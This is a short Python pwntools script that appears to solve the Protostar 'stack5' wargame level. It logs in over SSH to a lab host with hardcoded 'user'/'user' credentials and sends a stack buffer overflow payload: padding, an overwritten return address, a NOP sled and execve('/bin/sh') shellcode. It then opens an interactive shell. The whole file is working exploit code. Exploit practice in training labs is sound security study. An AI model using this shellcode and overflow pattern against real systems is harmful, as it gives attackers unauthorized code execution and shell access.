from pwn import *


term = ssh(host='10.100.102.19', user='user', password='user')
bash = term.run('bash')

buffer = 'a'*76
eip = p32(0xbffff7b0 + 8)
payload = buffer + eip + '\x90'*4 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

bash.sendline('/opt/protostar/bin/stack5')
bash.sendline(payload)
print(bash.recv())
bash.interactive()